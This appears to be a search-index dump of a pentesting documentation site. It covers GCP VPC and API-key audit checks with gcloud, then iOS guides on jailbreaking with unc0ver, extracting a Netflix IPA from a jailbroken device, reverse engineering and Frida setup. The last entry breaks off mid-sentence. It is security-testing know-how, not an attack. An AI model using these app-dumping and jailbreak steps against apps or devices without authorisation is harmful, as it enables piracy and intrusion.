therefore it is recommended to create a non-default VPC that suits your specific project requirements.</p> <p>To determine if the default Virtual Private Cloud (VPC) is being used within your GCP projects, perform the following actions:</p> <p>1. List all the projects from your google cloud .we will use the following command.</p> <pre><code>gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project identifiers (IDs):</p> <pre><code>PROJECT_ID\ncc-project5-stack-123123\ncc-web-dev-project-112233\n</code></pre> <p>3. Now we will run a command which list displays all Google Compute Engine networks in a project.</p> <pre><code>gcloud compute networks list  --project &lt;project name&gt;  --format=\"table(name)\"\n</code></pre> <p>4. The command output should return the name(s) of the VPC network(s) created for the selected project:</p> <pre><code>NAME\ndefault\n</code></pre> <p>If the compute networks list command output lists default as the name of one of the available networks in the project, as shown in the example above, the default Virtual Private Cloud is being used within the selected Google Cloud Platform  project.</p>"},{"location":"Pentesting/Cloud/GOOGLE%20VPC/#enable-cloud-dns-logging-for-vpc-networks","title":"Enable Cloud DNS Logging for VPC Networks","text":"<p>Cloud DNS logging is disabled by default on each Google Cloud VPC network. By enabling monitoring of Cloud DNS logs, you can increase visibility into the DNS names requested by the clients within your VPC network. Cloud DNS logs can be monitored for anomalous domain names and evaluated against threat intelligence.</p> <p>To determine if Cloud DNS logging is enabled for all your VPC networks, perform the following operations:</p> <p>1. Now we will run a command which list displays all Google Compute Engine networks in a project.</p> <pre><code>gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project identifiers (IDs):</p> <pre><code>PROJECT_ID\ncc-project5-stack-123123\ncc-web-dev-project-112233\n</code></pre> <p>3. Now we will run a command which list displays all Google Compute Engine networks in a project.</p> <pre><code>gcloud compute networks list  --project &lt;project name&gt;  --format=\"table(name)\"\n</code></pre> <p>4. The command output should return the names of the VPC networks created for the specified project:</p> <pre><code>NAME\ncc-prod-vpc-network\ncc-main-vpc-network\n</code></pre> <p>5. Run dns policies list command using the name of the VPC network that you want to examine as the filtering parameter, to describe the name of the DNS policy associated with the specified Virtual Private Cloud :</p> <pre><code>gcloud dns policies list --project cc-main-project-123123 --format='value(name)' --filter='networks[].networkUrl ~ cc-prod-vpc-network'\n</code></pre> <p>6. The command output should return the name of the associated DNS policy:</p> <pre><code>cc-prod-dns-policy\n</code></pre> <p>7. Run dns policies describe command  using the name of the DNS server policy that you want to examine as the identifier parameter, to describe the status of the DNS logging feature for the selected DNS policy:</p> <pre><code>gcloud dns policies describe cc-prod-dns-policy --format=\"value(enableLogging)\"\n</code></pre> <p>8. The command output should return the status of the Cloud DNS logging feature (True for enabled, False for disabled):</p> <pre><code>False\n</code></pre> <p>If the dns policies describe command output returns False, the Cloud DNS logging is not enabled for the selected VPC network.</p>"},{"location":"Pentesting/Cloud/GOOGLE%20VPC/#enable-logging-for-vpc-firewall-rules","title":"Enable Logging for VPC Firewall Rules","text":"<p>Firewall rule logging allows you to verify, analyze, and audit the effects of your VPC firewall rules on your cloud resources.</p> <p>To determine if logging is enabled for your VPC network firewall rules, perform the following operations:</p> <p>1. First list all the projects from your google cloud .we will use the following command</p> <pre><code>gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project identifiers (IDs):</p> <pre><code>PROJECT_ID\ncc-project5-stack-123123\ncc-web-platform-stack-112233\n</code></pre> <p>3. Now we will run a command which list displays all Google Compute Engine networks in a project.</p> <pre><code>gcloud compute networks list  --project &lt;project name&gt;  --format=\"table(name)\"\n</code></pre> <p>4. The command output should return the name(s) of the VPC network(s) created for the specified project:</p> <pre><code>NAME\ncc-app-stack-network\n</code></pre> <p>5. Run the gcloud compute firewall-rules list command which displays all Compute Engine firewall rules in a project. --filter network command is used for filtering the network and  sort command is used for sorting the priority.</p> <pre><code>gcloud compute firewall-rules list  --filter network=cc-web-stack-network --sort-by priority  --format=table\"(name,disabled,direction,logConfig)\"\n</code></pre> <p>6. The command output should return the requested information available for the existing VPC firewall rules:</p> <pre><code>NAME                    DISABLED  DIRECTION  LOG_CONFIG\ncc-allow-egress-access  False     EGRESS     {'enable': False}\ncc-allow-mysql-access   False     INGRESS    {'enable': False}\ncc-allow-ssh-access     False     INGRESS    {'enable': False}\n</code></pre> <p>Check the LOG_CONFIG configuration attribute value for any enabled firewall rules ) returned by the compute firewall-rules list command output. If the LOG_CONFIG attribute value is set to {'enable': False}, as shown in the example above, the rule logging is not enabled for the selected Google Cloud VPC network firewall rule.</p>"},{"location":"Pentesting/Cloud/GOOGLE%20VPC/#enable-vpc-flow-logs-for-vpc-subnets","title":"Enable VPC Flow Logs for VPC Subnets","text":"<p>By default, the VPC Flow Logs feature is disabled when a new VPC network subnet is created. Once enabled, VPC Flow Logs will start collecting network traffic data to and from your Virtual Private Cloud (VPC) subnets, logging data that can be useful for understanding network usage, network traffic expense optimization, network forensics, and real-time security analysis. To enhance Google Cloud VPC network visibility and security it is strongly recommended to enable Flow Logs for every business-critical or production VPC subnet.</p> <p>To determine if VPC Flow Logs is enabled for all your VPC network subnets, perform the following operations:</p> <p>1. First list all the projects from your google cloud .we will use the following command</p> <pre><code>gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project identifiers (IDs):</p> <pre><code>PROJECT_ID\ncc-project5-stack-123123\ncc-web-platform-stack-112233\n</code></pre> <p>3. Now we will run a command which list displays all Google Compute Engine networks in a project.</p> <pre><code>gcloud compute networks list  --project &lt;project name&gt;  --format=\"table(name)\"\n</code></pre> <p>4. The command output should return the name(s) of the VPC network(s) created for the specified project:</p> <pre><code>NAME\ncc-app-stack-network\n</code></pre> <p>5. Run compute networks subnets list command  using the name of the VPC network that you want to examine as identifier parameter and custom filtering to describe all the all the subnets created within the selected Virtual Private Cloud :</p> <pre><code>gcloud compute networks subnets list    --network=cc-web-stack-network  --format=table\"(name,region)\"\n</code></pre> <p>6. The command output should return the name and the region of each VPC subnet available inside the selected network:</p> <pre><code>NAME                     REGION\ncc-web-stack-network-01  us-central1\ncc-web-stack-network-02  europe-west1\ncc-web-stack-network-03  us-west1\ncc-web-stack-network-04  asia-east1\ncc-web-stack-network-05  us-east1\ncc-web-stack-network-06  asia-southeast1\ncc-web-stack-network-07  us-west2\ncc-web-stack-network-08  us-east4\ncc-web-stack-network-09  australia-southeast1\n</code></pre> <p>7. Run compute networks subnets describe command using the name and the region of each VPC subnet that you want to examine as identifier parameters, to describe the VPC Flow Logs configuration status for the selected Virtual Private Cloud  subnet:</p> <pre><code>gcloud compute networks subnets describe cc-web-stack-network-01    --region us-central1    --format json | jq '.enableFlowLogs'\n</code></pre> <p>8. The command output should return the requested configuration status :</p> <pre><code>false\n</code></pre> <p>If the compute networks subnets describe command output returns null or false, as shown in the example above, the Flow Logs feature is not enabled for the selected VPC subnet.</p>"},{"location":"Pentesting/Cloud/GOOGLE%20VPC/#exclude-metadata-from-firewall-logging","title":"Exclude Metadata from Firewall Logging","text":"<p>VPC firewall logging allows you to verify, analyze, and audit the effects of your firewall rules on your cloud resources. By default, metadata is added within the firewall rule log files. You can significantly reduce the log files size and cut down on storage costs by not including this additional data.</p> <p>To determine if logging metadata is included within your VPC firewall log files, perform the following operations:</p> <p>1. First list all the projects from your google cloud .we will use the following command</p> <pre><code>gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project identifiers (IDs):</p> <pre><code>PROJECT_ID\ncc-project5-stack-123123\ncc-web-platform-stack-112233\n</code></pre> <p>3. Now we will run a command which list displays all Google Compute Engine networks in a project.</p> <pre><code>gcloud compute networks list  --project &lt;project name&gt;  --format=\"table(name)\"\n</code></pre> <p>4. The command output should return the name(s) of the VPC network(s) created for the specified project:</p> <pre><code>NAME\ncc-web-stack-network\ncc-internal-vpc-network\n</code></pre> <p>5. Run compute firewall-rules list command  using the name of the VPC network that you want to examine as identifier parameter and custom filtering to list all the firewall rules  defined for the selected Virtual Private Cloud :</p> <pre><code>gcloud compute firewall-rules list  --filter network=cc-web-stack-network   --sort-by priority  --format=table\"(name,disabled,logConfig)\"\n</code></pre> <p>6. The command output should return the requested information available for the existing VPC firewall rules:</p> <pre><code>NAME                   DISABLED  LOG_CONFIG\ncc-allow-http-access   False     {'enable': True, 'metadata': 'INCLUDE_ALL_METADATA'}\ncc-allow-https-access  False     {'enable': True, 'metadata': 'INCLUDE_ALL_METADATA'}\n</code></pre> <p>Check the LOG_CONFIG configuration attribute value for any enabled firewall rules returned by the compute firewall-rules list command output. If the LOG_CONFIG attribute value is set to {'enable': True, 'metadata': 'INCLUDE_ALL_METADATA'}, as shown in the example above, the firewall logging is enabled and the logging metadata is included within the VPC network firewall rule log files.</p>"},{"location":"Pentesting/Cloud/gcp-api/","title":"GCP API","text":""},{"location":"Pentesting/Cloud/gcp-api/#gcp-api","title":"GCP API","text":"<p>GCP (Google Cloud Platform) provides a wide range of APIs (Application Programming Interfaces) that developers can use to build applications that interact with various GCP services. These APIs include the Google Cloud Storage API for managing object storage, the Google Cloud Vision API for image recognition and analysis, the Google Cloud Speech-to-Text API for converting audio to text, the Google Cloud Natural Language API for text analysis, and the Google Cloud Translation API for real-time language translation. There are many more APIs available, and developers can access them through REST APIs, client libraries, or the Google Cloud Console.</p>"},{"location":"Pentesting/Cloud/gcp-api/#check-for-api-key-api-restrictions","title":"Check for API Key API Restrictions","text":"<p>1. Run projects list command to list the project</p> <pre><code>gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project IDs:</p> <pre><code>PROJECT_ID\n  cc-project5-112233\n  cc-internal-111222\n</code></pre> <p>3. Run services api-keys list commandlists keys of a given project, including keys that were soft-deleted in the past 30 days</p> <pre><code>gcloud alpha services api-keys list  --project=cc-project5-112233  --format=\"table(uid)\"\n</code></pre> <p>4. The command output should return the IDs of the active API keys:</p> <pre><code>UID:\n  abcd1234-abcd-1234-abcd-1234abcd1234\n  1234abcd-1234-abcd-1234-abcd1234abcd\n</code></pre> <p>5. gcloud alpha services api-keys describe - describe an API key's metadata</p> <pre><code>gcloud alpha services api-keys describe abcd1234-abcd-1234-abcd-1234abcd1234 --format=\"json(restrictions)\"\n</code></pre> <p>6. Based on the services api-keys describe command output, you can determine whether or not the use of the selected API key is restricted to specific APIs only:</p> <ul> <li>If the command output returns null, there is no API restriction control enabled, therefore the selected API key can call any supported Google Cloud Platform (GCP) API:</li> </ul> <pre><code>null\n</code></pre> <ul> <li>If the command output returns one or more APIs, check the \"apiTargets\" array for the list of GCP APIs that can use the selected API key. If the \"apiTargets\" array contains \"cloudapis.googleapis.com\", as shown in the example below, the selected API key can call any GCP API because the \"cloudapis.googleapis.com\" option represents the API collection of all the cloud services/APIs offered by Google Cloud Platform:</li> </ul> <pre><code>{\n  \"restrictions\": {\n    \"apiTargets\": [\n      {\n        \"service\": \"cloudapis.googleapis.com\"\n      }\n    ]\n  }\n}\n</code></pre> <p>7. Repeat steps no. 5 and 6 for each API key generated for the selected GCP project. 8. Repeat steps no. 3 \u2013 7 for each project deployed within your Google Cloud account.</p>"},{"location":"Pentesting/Cloud/gcp-api/#check-for-api-key-application-restrictions","title":"Check for API Key Application Restrictions","text":"<p>1. Run projects list command to list the project</p> <pre><code>gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project IDs:</p> <pre><code>PROJECT_ID\n  cc-project5-112233\n  cc-internal-111222\n</code></pre> <p>3. Run services api-keys list command  using the ID of the GCP project that you want to examine as the identifier parameter and custom query filters to describe the identifier of each active API key generated for the selected project:</p> <pre><code>gcloud alpha services api-keys list  --project=cc-project5-112233  --format=\"table(uid)\"\n</code></pre> <p>4. The command output should return the IDs of the active API keys:</p> <pre><code>UID:\n  abcd1234-abcd-1234-abcd-1234abcd1234\n  1234abcd-1234-abcd-1234-abcd1234abcd\n</code></pre> <p>5. Run services api-keys describe command (Windows/macOS/Linux) using the ID of the API key that you want to examine as the identifier parameter and custom query filters to describe the API key application restrictions configured for the selected key:</p> <pre><code>gcloud alpha services api-keys describe abcd1234-abcd-1234-abcd-1234abcd1234  --format=\"json(restrictions)\"\n</code></pre> <p>6. Based on the services api-keys describe command output, you can determine if the use of the selected API key is unrestricted:</p> <ul> <li>If the command output returns null, there is no restriction control enabled to specify which websites, IP addresses, or mobile applications can use the key, therefore the selected API key usage is unrestricted:</li> </ul> <pre><code>null\n</code></pre> <ul> <li>If the command output returns one or more HTTP referrers for API key application restrictions, as shown in the example above, check the \"allowedReferrers\" array for the list of domains that can use the selected API key. If the referrer is set to a wildcard, i.e. * or *.[TLD] or *.[TLD]/*, where [TLD] represents the top-level domain, there are no well-defined restrictions that specify which trusted websites can use your key, therefore the selected API key usage is unrestricted:</li> </ul> <pre><code>{\n  \"restrictions\": {\n    \"browserKeyRestrictions\": {\n      \"allowedReferrers\": [\n        \"*.example.com\"\n      ]\n    }\n  }\n}\n</code></pre> <ul> <li>If the services api-keys describe command output returns one or more IPv4/IPv6 addresses for API key application restrictions, as shown in the example above, check the \"allowedIps\" array for the list of hosts that can access the selected API key. If the \"allowedIps\" is set to any host, i.e. 0.0.0.0, 0.0.0.0/0 or ::0, there is no restriction control implemented to specify which host can use your key, therefore the selected API key usage is unrestricted:</li> </ul> <pre><code>{\n  \"restrictions\": {\n    \"serverKeyRestrictions\": {\n      \"allowedIps\": [\n        \"0.0.0.0/0\"\n      ]\n    }\n  }\n}\n</code></pre> <p>7. Repeat steps no. 5 and 6 for each API key generated for the selected GCP project. 8. Repeat steps no. 3 \u2013 7 for each project deployed within your Google Cloud account.</p>"},{"location":"Pentesting/Cloud/gcp-api/#enable-cloud-asset-inventory","title":"Enable Cloud Asset Inventory","text":"<p>1. Run projects list command to list the project</p> <pre><code>gcloud projects list  --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project identifiers:</p> <pre><code>PROJECT_ID\ncc-web-project-112233\ncc-mobile-project-123123\n</code></pre> <p>3. Run services list command which lists API keys</p> <pre><code>gcloud services list  --project cc-web-project-112233  --enabled  --filter=name:cloudasset.googleapis.com\n</code></pre> <p>4. The command output should return the name and the title of the requested API:</p> <pre><code>Listed 0 items.\n</code></pre> <p>If the services list command output returns Listed 0 items, as shown in the output example above, the Cloud Asset API is currently disabled, therefore the Google Cloud Asset Inventory is not enabled for the selected GCP project.</p> <p>5. Repeat steps no. 3 and 4 for each project created within your Google Cloud account.</p>"},{"location":"Pentesting/Cloud/gcp-api/#rotate-google-cloud-api-keys","title":"Rotate Google Cloud API Keys","text":"<p>1. Run projects list command (Windows/macOS/Linux) with custom query filters to list the ID of each project available in your Google Cloud account:</p> <pre><code>gcloud projects list --format=\"table(projectId)\"\n</code></pre> <p>2. The command output should return the requested GCP project IDs:</p> <pre><code>PROJECT_ID\n  cc-project5-112233\n  cc-internal-123123\n  cc-web-prod-111222\n</code></pre> <p>3. Run services api-keys list command  using the ID of the GCP project that you want to examine as the identifier parameter and custom query filters to describe the identifier of each active API key created for the selected project:</p> <pre><code>gcloud alpha services api-keys list  --project=cc-project5-112233   --format=\"table(uid)\"\n</code></pre> <p>4. The command output should return the IDs of the active API keys:</p> <pre><code>UID:\n  abcd1234-abcd-1234-abcd-1234abcd1234\n  1234abcd-1234-abcd-1234-abcd1234abcd\n</code></pre> <p>5. Run services api-keys describe command  using the ID of the API key that you want to examine as the identifier parameter and custom query filters to describe the API key application restrictions configured for the selected key:</p> <pre><code>gcloud alpha services api-keys describe abcd1234-abcd-1234-abcd-1234abcd1234  --format=\"json(createTime)\"\n</code></pre> <p>6. The command output should return the API key creation date/time:</p> <pre><code>CREATE_TIME: 2020-10-25T09:01:20.329336Z\n</code></pre> <p>Check the timestamp returned by the services api-keys describe command output to determine when the selected API key was created. If more than 90 days have passed since the key was created, the selected Google Cloud Platform (GCP) API key is not regenerated (rotated) on a regular basis.</p> <p>7. Repeat steps no. 5 and 6 for each API key generated for the selected GCP project. 8. Repeat steps no. 3 \u2013 7 for each project deployed within your Google Cloud account.</p>"},{"location":"Pentesting/IOS/command-line-cheatsheet-for-ios-pt/","title":"Command Line Cheat Sheet for iOS Penetration Testing","text":""},{"location":"Pentesting/IOS/command-line-cheatsheet-for-ios-pt/#command-line-cheat-sheet-for-ios-penetration-testing","title":"Command Line Cheat Sheet for iOS Penetration Testing","text":""},{"location":"Pentesting/IOS/command-line-cheatsheet-for-ios-pt/#preparation","title":"Preparation","text":"<p>Install Brew, which simplifies package installation on macOS. Use the following command in the Terminal (Finder -&gt; Applications -&gt; Utilities -&gt; Terminal):</p> <pre><code>$ /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"\n</code></pre> <p>Install XCode to get essential developer tools. In the Terminal, execute:</p> <pre><code>$ xcode-select --install\n</code></pre> <p>Alternatively, XCode can be downloaded manually from the Apple Website.</p> <p>Register your Apple ID as an Apple Developer Account. No need for a paid Apple Developer Program membership at this stage, as you only need a certificate for signing IPA files in XCode or other tools.</p>"},{"location":"Pentesting/IOS/command-line-cheatsheet-for-ios-pt/#ssh-over-usb-iproxy","title":"SSH Over USB (iPROXY)","text":"<p>Guide and tools for establishing SSH connections over USB can be found on the iPhoneDevWiki.</p>"},{"location":"Pentesting/IOS/command-line-cheatsheet-for-ios-pt/#download-ipa-file-from-the-app-store-or-iphoneipad-device","title":"Download .ipa file from the App Store or iPhone/iPad device","text":""},{"location":"Pentesting/IOS/command-line-cheatsheet-for-ios-pt/#for-jailbroken-devices","title":"For Jailbroken Devices","text":"<p>Clutch: A tool for decrypting iOS apps. Detailed information and downloads can be found on GitHub.</p> <p>Frida Script:</p> <p>To use frida-ios-dump, set up port forwarding with iProxy first: </p><pre><code>$ iproxy 2222 22\n</code></pre> Then dump the app: <pre><code>$ ./dump.py BundleID\n</code></pre>"},{"location":"Pentesting/IOS/command-line-cheatsheet-for-ios-pt/#ios-binary-analysis","title":"iOS Binary Analysis","text":""},{"location":"Pentesting/IOS/command-line-cheatsheet-for-ios-pt/#ios-analysis","title":"ios-Analysis","text":"<p>Download and setup: </p><pre><code>$ git clone https://github.com/IAIK/ios-analysis\n$ cd ios-analysis\n$ git submodule update --init --recursive\n</code></pre> If encountering an error like: <code>error: RPC failed; curl 56 LibreSSL SSL_read: SSL_ERROR_SYSCALL, errno 60</code>, try: <pre><code>$ git config http.postBuffer 524288000\n</code></pre>"},{"location":"Pentesting/IOS/command-line-cheatsheet-for-ios-pt/#sign-install-ipa-using-windows","title":"Sign &amp; Install .ipa using Windows","text":"<ul> <li>Download AltSigner.</li> <li>Install the latest version of iTunes directly from Apple (not from the Microsoft Store).</li> <li>Open iTunes, connect your device, and copy the UDID from the device summary page.</li> <li>Open AltSigner, input your Apple ID, password, UDID, and the path to the .ipa file. </li> <li>Click <code>Sign</code> to sign the .ipa file, and <code>Install</code> to install it on your device.</li> </ul>"},{"location":"Pentesting/IOS/command-line-cheatsheet-for-ios-pt/#signing-ipa-file-with-our-provisioning-profile","title":"Signing IPA File with Our Provisioning Profile","text":"<p>For a GUI-based approach, use iOS App Signer. This tool simplifies the process of signing IPA files using your own provisioning profiles, which you can generate via XCode when installing an application.</p>"},{"location":"Pentesting/IOS/command-line-cheatsheet-for-ios-pt/#troubleshoot","title":"Troubleshoot","text":"<p>Ensure that you always check the console for error messages and refer to online resources or communities if specific errors arise during installation or operation of the tools mentioned.</p>"},{"location":"Pentesting/IOS/how-to-extract-ipa-from-idevice-manually./","title":"How to Extract an IPA from an iDevice Manually","text":""},{"location":"Pentesting/IOS/how-to-extract-ipa-from-idevice-manually./#how-to-extract-an-ipa-from-an-idevice-manually","title":"How to Extract an IPA from an iDevice Manually","text":""},{"location":"Pentesting/IOS/how-to-extract-ipa-from-idevice-manually./#components-needed","title":"Components Needed","text":"<ul> <li>Host Computer: A computer that can connect to the iOS device via SSH.</li> <li>Jailbroken iOS Device: The device must have a zip utility installed.</li> </ul>"},{"location":"Pentesting/IOS/how-to-extract-ipa-from-idevice-manually./#overview","title":"Overview","text":"<p>This tutorial will demonstrate how to manually extract the IPA file of an application directly from an iOS device.</p>"},{"location":"Pentesting/IOS/how-to-extract-ipa-from-idevice-manually./#objective","title":"Objective","text":"<p>To manually extract the IPA file of the Netflix application from a jailbroken iOS device.</p> <p></p>"},{"location":"Pentesting/IOS/how-to-extract-ipa-from-idevice-manually./#steps","title":"Steps","text":""},{"location":"Pentesting/IOS/how-to-extract-ipa-from-idevice-manually./#1-establish-an-ssh-connection-to-your-idevice","title":"1. Establish an SSH Connection to Your iDevice","text":""},{"location":"Pentesting/IOS/how-to-extract-ipa-from-idevice-manually./#2-locate-the-application-sandbox-directory","title":"2. Locate the Application Sandbox Directory","text":"<p>This directory contains the application bundles.</p> <pre><code>/var/containers/Bundle/Application/\n</code></pre> <p></p>"},{"location":"Pentesting/IOS/how-to-extract-ipa-from-idevice-manually./#3-search-for-the-app-directory","title":"3. Search for the .app Directory","text":"<p>Use the command below to locate the Netflix app directory:</p> <pre><code>find | grep \"Netflix\"\n</code></pre> <p></p>"},{"location":"Pentesting/IOS/how-to-extract-ipa-from-idevice-manually./#4-manually-list-directories-if-necessary","title":"4. Manually List Directories if Necessary","text":"<p>If the specific .app directory is not found, list all directories with:</p> <pre><code>ls *\n</code></pre> <p>Then, manually search for the correct directory.</p> <p></p>"},{"location":"Pentesting/IOS/how-to-extract-ipa-from-idevice-manually./#5-navigate-to-the-app-directory","title":"5. Navigate to the .app Directory","text":"<p>Move to the Netflix app directory.</p> <p></p>"},{"location":"Pentesting/IOS/how-to-extract-ipa-from-idevice-manually./#6-create-a-new-folder-named-payload","title":"6. Create a New Folder Named 'Payload'","text":""},{"location":"Pentesting/IOS/how-to-extract-ipa-from-idevice-manually./#7-copy-the-app-file-into-the-payload-folder","title":"7. Copy the App File into the 'Payload' Folder","text":"<p>Use the following command to copy the app bundle:</p> <pre><code>cp -r Netflix.app/ Payload/\n</code></pre> <p></p>"},{"location":"Pentesting/IOS/how-to-extract-ipa-from-idevice-manually./#8-compress-the-payload-folder-into-an-ipa-file","title":"8. Compress the Payload Folder into an IPA File","text":"<p>Execute the zip command to create an IPA file:</p> <pre><code>zip -r /var/root/dumpNetflix.ipa Payload/\n</code></pre> <p></p>"},{"location":"Pentesting/IOS/how-to-extract-ipa-from-idevice-manually./#9-transfer-the-ipa-file-to-the-host-machine","title":"9. Transfer the IPA File to the Host Machine","text":"<p>Use SFTP to download the IPA file:</p> <p></p>"},{"location":"Pentesting/IOS/how-to-extract-ipa-from-idevice-manually./#10-retrieve-the-ipa-file-on-your-host-computer","title":"10. Retrieve the IPA File on Your Host Computer","text":"<p>Use the <code>get</code> command to download the file:</p> <pre><code>get -r /var/root/dumpNetflix.ipa\n</code></pre> <p></p> <p>Following these steps, you will have successfully extracted the IPA file of the Netflix app from your jailbroken iOS device to your host computer for further analysis.</p>"},{"location":"Pentesting/IOS/lets-jailbreak-iphone-ipad/","title":"Jailbreaking iPhone/iPad","text":""},{"location":"Pentesting/IOS/lets-jailbreak-iphone-ipad/#jailbreaking-iphoneipad","title":"Jailbreaking iPhone/iPad","text":""},{"location":"Pentesting/IOS/lets-jailbreak-iphone-ipad/#overview","title":"Overview","text":"<p>This guide demonstrates a straightforward method for jailbreaking an iPhone or iPad. It utilizes the Unc0ver jailbreak tool, which supports devices running iOS versions 11.0 to 12.4.1.</p>"},{"location":"Pentesting/IOS/lets-jailbreak-iphone-ipad/#prerequisites","title":"Prerequisites","text":"<ul> <li>An iPhone or iPad running iOS version between 11.0 and 12.4.</li> <li>A stable internet connection for downloading necessary files.</li> </ul>"},{"location":"Pentesting/IOS/lets-jailbreak-iphone-ipad/#jailbreaking-methods","title":"Jailbreaking Methods","text":"<p>You can perform the jailbreak via:</p> <ul> <li>Directly on the device without a computer.</li> <li>Using Cydia Impactor to install the Unc0ver IPA.</li> <li>Using 3UTools on a PC.</li> </ul> <p></p> <p>For more details on jailbreaking, visit Can I Jailbreak?.</p>"},{"location":"Pentesting/IOS/lets-jailbreak-iphone-ipad/#steps-to-jailbreak","title":"Steps to Jailbreak","text":""},{"location":"Pentesting/IOS/lets-jailbreak-iphone-ipad/#1-verify-device-version","title":"1. Verify Device Version","text":"<p>Ensure your device is running a compatible iOS version (11.0 - 12.4). To check, navigate to Settings &gt; General &gt; About.</p> <p></p>"},{"location":"Pentesting/IOS/lets-jailbreak-iphone-ipad/#2-download-the-unc0ver-jailbreak-tool","title":"2. Download the Unc0ver Jailbreak Tool","text":"<p>Visit either <code>https://app.app-valley.vip/</code> or <code>https://iosninja.io/ipa-library</code> to download the Unc0ver jailbreak app.</p> <p></p>"},{"location":"Pentesting/IOS/lets-jailbreak-iphone-ipad/#3-trust-the-developer","title":"3. Trust the Developer","text":"<p>Upon trying to open the app, you'll likely encounter an \"Untrusted Developer\" error. To resolve this, go to Settings &gt; General &gt; Profiles &amp; Device Management, find the developer, and trust it.</p> <p></p>"},{"location":"Pentesting/IOS/lets-jailbreak-iphone-ipad/#4-initiate-jailbreak","title":"4. Initiate Jailbreak","text":"<p>Open the Unc0ver app and tap on 'Jailbreak' or 'Re-jailbreak' if previously done. Ensure your device is in airplane mode to increase the success rate of the jailbreak.</p> <p></p>"},{"location":"Pentesting/IOS/lets-jailbreak-iphone-ipad/#5-complete-the-jailbreak","title":"5. Complete the Jailbreak","text":"<p>After the jailbreak process completes, the device will restart. You might see a notification stating \"Jailbreak Completed.\" Confirm by pressing 'OK'.</p> <p></p>"},{"location":"Pentesting/IOS/lets-jailbreak-iphone-ipad/#6-respring-the-device","title":"6. Respring the Device","text":"<p>Once the device has restarted, it may require a respring. Enter your passcode if prompted.</p>"},{"location":"Pentesting/IOS/lets-jailbreak-iphone-ipad/#7-verify-jailbreak","title":"7. Verify Jailbreak","text":"<p>To confirm the jailbreak, connect to your device via SSH (default password is 'alpine'). This can be done from a terminal or an SSH client, using the device's IP address found in WiFi settings.</p> <p></p> <p>Upon successful jailbreak, the Cydia app should be visible on your home screen, indicating that your device is now jailbroken.</p> <p>For further details on tools for iOS penetration testing and how to use them, check out future posts.</p>"},{"location":"Pentesting/IOS/lets-jailbreak-iphone-ipad/#more-resources","title":"More Resources","text":"<ul> <li>Jailbreak Central</li> <li>Reddit's r/jailbreak</li> </ul> <p>If you need further assistance, feel free to consult the FAQs or ask the community on forums like Reddit.</p> <p>Happy Jailbreaking!</p>"},{"location":"Pentesting/IOS/reverse-engineering/","title":"Reverse Engineering","text":""},{"location":"Pentesting/IOS/reverse-engineering/#reverse-engineering","title":"Reverse Engineering","text":"<p>Reverse engineering is a crucial step in iOS pentesting, as it allows you to analyze and understand the inner workings of iOS apps and identify potential vulnerabilities. Here are some steps you can follow to get started with reverse engineering in iOS pentesting:</p> <p>1. Set up your environment</p> <p>To start reversing iOS apps, you'll need a toolchain that can handle iOS binaries. Some popular options include:</p> <ul> <li>Xcode: Apple's official integrated development environment (IDE) that includes a suite of development tools, libraries, and documentation.</li> <li>XCode-Reverse: A plugin for Xcode that adds reverse engineering capabilities.</li> <li>Hopper: A disassembler and decompiler for iOS and macOS binaries.</li> <li>IDA Pro: A commercial disassembler and decompiler that supports iOS binaries. 2. Get the app you want to reverse:</li> </ul> <p>You can either use an app you've developed yourself or download one from the App Store. Make sure you have the app's .ipa file, which contains the compiled binary.</p> <p>3. Extract the binary:</p> <p>Use a tool like ipa2tcp to extract the binary from the .ipa file. This will give you the Mach-O file, which is the compiled binary that can be reversed.</p> <p>4. Load the binary in a disassembler:</p> <p>Open the Mach-O file in a disassembler like Hopper or IDA Pro. This will allow you to see the assembly code that makes up the app.</p> <p>5. Understand the assembly code:</p> <p>Start by familiarizing yourself with the assembly code. Look for functions that handle user input, network communication, or data storage. These areas are likely to have vulnerabilities.</p> <p>6. Identify functions and APIs:</p> <p>Identify functions and APIs that are likely to be vulnerable. Look for functions that handle user input, network communication, or data storage.</p> <p>7. Analyze function calls:</p> <p>Analyze function calls to identify potential vulnerabilities. Look for functions that accept user input, as these may be vulnerable to attacks like buffer overflows or format string vulnerabilities.</p> <p>8. Look for hardcoded values:</p> <p>Look for hardcoded values like API keys, encryption keys, or other sensitive data. These can be potential vulnerabilities.</p> <p>9. Look for network communication:</p> <p>Identify network communication patterns, such as API endpoints, protocols, and payload structures. This can help you identify potential vulnerabilities in the app's communication with its backend.</p> <p>10. Look for vulnerabilities:</p> <p>Look for potential vulnerabilities like SQL injection, cross-site scripting (XSS), cross-site request forgery (CSRF), or buffer overflows.</p> <p>11. Exploit the vulnerabilities:</p> <p>Once you've identified potential vulnerabilities, try to exploit them. Use tools like Burp Suite or ZAP to identify injection points and exploit them.</p>"},{"location":"Pentesting/IOS/reverse-engineering/#reference","title":"Reference","text":"<ul> <li>https://github.com/OWASP/owasp-mstg/blob/master/Document/0x06c-Reverse-Engineering-and-Tampering.md</li> </ul>"},{"location":"Pentesting/IOS/setting-up-frida%2Bobjection/","title":"Setting Up Frida+Objection","text":""},{"location":"Pentesting/IOS/setting-up-frida%2Bobjection/#setting-up-fridaobjection","title":"Setting Up Frida+Objection","text":"<p>Here we would see how we can setup Frida, Objection, Fireprint Scanner for firebase DB scan, How to dump iPA file to perform Reverse Engineering and Static Analysis using Opensource Tool Mobsf. Also, look at how we use Frida to decrypt iOS files from the iDevice.</p> <p>Let's have a short introduction to the following terms before proceeding further.</p> <p></p>"},{"location":"Pentesting/IOS/setting-up-frida%2Bobjection/#frida","title":"Frida","text":"<p>Frida is a free and open-source dynamic instrumentation toolkit, that allows developers, reverse-engineers, and security researchers to monitor and debug running processes. It also enables programmers, software and security professionals to execute their own JS scripts into other processes running on</p>"},{"location":"Pentesting/IOS/setting-up-frida%2Bobjection/#objection","title":"Objection","text":"<p>It's a runtime mobile exploration toolkit, powered by Frida, built to help you assess the security posture of your mobile applications, without needing a 